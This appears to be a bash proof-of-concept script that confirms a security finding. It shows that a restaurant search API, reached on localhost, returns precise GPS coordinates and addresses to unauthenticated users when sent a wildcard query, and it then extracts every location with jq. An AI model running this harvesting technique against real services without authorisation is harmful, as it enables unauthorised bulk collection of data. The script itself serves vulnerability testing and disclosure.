#!/bin/bash

# POC: GPS Coordinates Exposure in Public API
# This script demonstrates that unauthenticated users can access precise GPS coordinates
# and complete location information for all restaurants via the search API endpoint

TARGET_URL="http://localhost:8080"
API_ENDPOINT="/api/search_restaurants.php"
QUERY_PARAM="query=%"

echo "=========================================="
echo "GPS Coordinates Exposure POC"
echo "=========================================="
echo ""
echo "Target: ${TARGET_URL}${API_ENDPOINT}?${QUERY_PARAM}"
echo ""
echo "Step 1: Testing unauthenticated access with wildcard search..."
echo ""

# Make request to search API with wildcard query to retrieve all restaurants
RESPONSE=$(curl -s "${TARGET_URL}${API_ENDPOINT}?${QUERY_PARAM}")

echo "Response received:"
echo "$RESPONSE" | jq '.' 2>/dev/null || echo "$RESPONSE"
echo ""

# Check if response contains GPS coordinates
if echo "$RESPONSE" | grep -q "latitude\|longitude"; then
    echo "✓ VULNERABILITY CONFIRMED: GPS coordinates exposed in API response"
    echo ""
    
    # Extract and display GPS data
    echo "Step 2: Extracting GPS coordinates from response..."
    echo ""
    
    if command -v jq &> /dev/null; then
        # Count restaurants returned
        RESTAURANT_COUNT=$(echo "$RESPONSE" | jq 'length' 2>/dev/null || echo "unknown")
        echo "Restaurants returned: $RESTAURANT_COUNT"
        echo ""
        
        # Display first restaurant with GPS data
        echo "Sample restaurant with exposed GPS coordinates:"
        echo "$RESPONSE" | jq '.[0] | {name, address, latitude, longitude, category}' 2>/dev/null
        echo ""
        
        # Show all restaurants with just location data
        echo "All restaurants with GPS coordinates:"
        echo "$RESPONSE" | jq '.[] | {name, address, latitude, longitude}' 2>/dev/null
    fi
else
    echo "✗ No GPS data found in response"
    exit 1
fi

echo ""
echo "Step 3: Verification - No authentication required"
echo "Request made without any authentication headers (no Authorization, no session cookies)"
echo "HTTP 200 response received with complete location data"
echo ""
echo "=========================================="
echo "VULNERABILITY SEVERITY: LOW"
echo "=========================================="
echo "✓ Precise GPS coordinates are publicly accessible"
echo "✓ Complete restaurant locations available without authentication"
echo "✓ Data harvesting possible via wildcard search"
echo "=========================================="